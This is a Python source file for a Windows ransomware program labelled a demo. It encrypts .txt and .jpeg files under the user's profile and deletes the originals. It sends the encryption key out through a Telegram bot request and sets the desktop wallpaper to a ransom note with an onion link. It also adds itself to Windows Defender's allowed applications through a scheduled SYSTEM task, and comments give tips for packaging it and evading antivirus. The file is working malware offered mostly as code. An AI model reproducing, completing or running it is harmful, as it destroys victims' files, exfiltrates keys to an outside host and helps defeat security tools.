#!/usr/bin/python3
import json
import ctypes
import threading, pathlib, tkinter
import os, requests, sys
import nacl.secret as ns
import nacl.utils as nu
from PIL import Image, ImageDraw, ImageFont
from win32api import GetSystemMetrics
import tkinter as tk
from tkinter import messagebox
from time import sleep
import string
import subprocess

FILEPATH = sys.argv[0]

# ---------------------------------------------------------------
#
# Convert .py to .exe:
# PyInstaller --onefile -w --icon icon.png Ransomware.py
#
# -----------------------
#
# https://theitbros.com/run-powershell-script-as-administrator/
# Open the Task Scheduler console (taskschd.msc);
# Select Action > Create Task;
# Specify the task name PowerShellAdminTask;
# Check the option Run with highest privileges;
# Select Windows 10 in the Configure form;
#
# schtasks.exe /run /tn PowerShellAdminTask
# Add-MpPreference -ControlledFolderAccessAllowedApplications "C:\malware\ransomware\dist\Ransomware.exe"
#
# Encrypt code
# https://stackoverflow.com/questions/64788656/exe-file-made-with-pyinstaller-being-reported-as-a-virus-threat-by-windows-defen
#
# Check last 15 processes blocked by Windows Defender
# wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /q:"*[System[(EventID=1123)]]" /c:15 /f:text /rd:true | findstr /i "process name:"
#
# create Windows task
# https://superuser.com/a/1051502
# schtasks /create /tn RunCMD /tr "cmd /C '%1'" /rl HIGHEST /ru <user> /rp <password> /sc once /st %t:~0,8% /sd %d:~4,10% /v1 /z
#
# ---------------------------------------------------------------

# create_task = 'SCHTASKS /CREATE /SC ONLOGON /TN "PowerShellAdminTask" /RU "SYSTEM" /RL HIGHEST ' \
#         r'/TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file c:\temp\allow_app.ps1"'
#
# subprocess.call(create_task, shell=True)

USERNAME = os.getlogin()

if 'admin' in USERNAME:
    try:
        powershell_command = f'Add-MpPreference -ControlledFolderAccessAllowedApplications "{FILEPATH}"'
        with open(r'c:\temp\allow_app.ps1', mode='w+') as f:
            f.write(powershell_command)

        run_task = 'schtasks.exe /run /tn PowerShellAdminTask'
        subprocess.call(run_task, shell=True)
    except:
        pass

with open("C:\\malware\\ransomware\\secrets\\telegram_token.json", mode="r", encoding='utf-8') as f:
    secrets = json.loads(f.read())

Token = secrets.get('token', None)   # Telegram Api Token
NumID = secrets.get('userid', None)  # Our User ID

User = os.getlogin()
Script = sys.argv[0]
MaxThread = 120

Key = nu.random(ns.SecretBox.KEY_SIZE)
Box = ns.SecretBox(Key)

with open('C:\\malware\\ransomware\\secrets\\key.txt', mode='wb+') as f:
    f.write(Key)

PathList = [f'C:\\Users\\{User}']
skip_file_extensions = [".dll", ".exe", ".msn", ".blf"]

skip_directories = ['$Recycle.Bin', '$WinREAgent', 'Documents and Settings', 'DumpStack.log.tmp',
                    'malware', 'pagefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)',
                    'ProgramData', 'Recovery', 'swapfile.sys', 'System Volume Information', 'Windows',
                    'AppData', 'System32', 'NTUSER.DAT', 'Tor Browser', 'Public', 'Default']

allowed_extensions = [".txt", ".jpeg"]

'''
import os
def list_subdirs(in_path):
    subdirs = []
    for x in os.walk(in_path):
        subdirs.append(x[0])
    return subdirs
r = list_subdirs('C:\\Users\\')
with open('c:\\Temp\\dirs.txt', mode='w+') as f:
    f.write('\n'.join(r))
'''


letters = string.ascii_lowercase
#PathList = [i + ":\\" for i in letters]
#PathList.remove("c:\\")  # Removing C Drive

print(f"Key - >  {Key}")  # Remove This line this is just for Debuging

ransome_note = r"""

                    First of all it is just a business and the only thing we are interested in is money.
                    
                    Hello!
                    
                    All your data was encrypted.
                    
                    Please don't try to modify or rename any of encrypted files, because it can result in serious
                    data loss and decryption failure.
                    
                    Here is your personal link with full information regarding this accident (use Tor browser):

                        http://lofl2h2vr5wqyucvnra4oi5crv7ccaad.onion/e8pnrkuox353
                        
                    
                    Have a nice day.
"""


class Encrypt(object):

    def __init__(self, target=None, boxm=None, url=None):
        self.Target = target        # File Path
        self.BoxM = boxm            # Our Box Moudle
        self.Url = url              # Our Api Url in my case Telegram

    def FileE(loc):                 # We Pass File Name And Path In Hare In Order To Encrypt Them
        try:
            if not os.path.isdir(loc.Target):           # Check if Its File not Directory

                with open(loc.Target, "rb") as f:    # Opeing file
                        data = f.read()              # Reading File & Saving it In tmp Var
               
                FileName = loc.Target                   # File name
                Encrypted = loc.BoxM.encrypt(data)      # Encrypting tmp Var

                if loc.Target != sys.argv[0]:          # If Target File is not Our own script Do this
                   with open(f"{FileName}.encrypted", "wb") as File:
                       File.write(Encrypted)
                   os.remove(loc.Target)

        except Exception as e:
            print(f"Error -> {e}")

    def SendKey(Key):               # We Pass Decrypt Key and Api url To Make Get request
        requests.get(Key.Url)       # We send request


def OneStart():
    
    try:
        keyhex = Key.hex()
        HttpReq = Encrypt(url=f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={NumID}&text={keyhex}")
        threading.Thread(target=HttpReq.SendKey, args=()).start()

        Img = Image.new('RGB', (GetSystemMetrics(0), GetSystemMetrics(1)), color=(0, 0, 0))   # Getting Window Heihgt & Weight To Make Background

        Canvas = ImageDraw.Draw(Img)                                        # Drawing Image
        font = ImageFont.truetype("arial", int(GetSystemMetrics(1)/34))     # Getting Right Font Size
        Canvas.text((10,10), ransome_note, fill=(255, 0, 0), font=font)     # Write Text On Image
 
        Img.save('README.png')

        ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\README.png', 0)     # Set New Background Up

    except:pass


def CallErrorBox():
    WINDOW  = tkinter.Tk()  # Making Tk Window
    WINDOW.withdraw()       # Destroying  Tk Window
    messagebox.showerror("Error", "Try To Re-Run As Administrator")


def proceed_warning():
    msg_box = tk.messagebox.askquestion('Juan Ransomware Demo',
                                        'Are you sure you want to run the ransomware demo?',
                                        icon='warning')
    if msg_box == 'no':
        sys.exit()


if __name__ == '__main__':
    proceed_warning()
    OneStart()
    for AllFiles in PathList:
        try:
            if pathlib.Path(AllFiles).exists():

                for path, subdirs, files in os.walk(AllFiles):

                    if not any(True if sd in path else False for sd in skip_directories):
                        for name in files:

                            FilePath = os.path.join(path, name)      # Join File path to File Name
                            FileSize = os.stat(FilePath).st_size     # Get The File Size
                            filename, file_extension = os.path.splitext(FilePath)

                            if file_extension in allowed_extensions and file_extension not in skip_file_extensions:
                                if FileSize >= 50_000_000:
                                    # If File size is More then 50mb make Thread for this file
                                    while True:
                                        if len(threading.enumerate()) < MaxThread:
                                            EncrypterObj = Encrypt(target=FilePath, boxm=Box)
                                            threading.Thread(target=EncrypterObj.FileE, args=()).start()
                                            break
                                        else:
                                            sleep(0.2)
                                else:
                                    print(FilePath)
                                    Encrypt(target=FilePath, boxm=Box).FileE()
        except Exception as e:
            print(f"Error -> {e}")
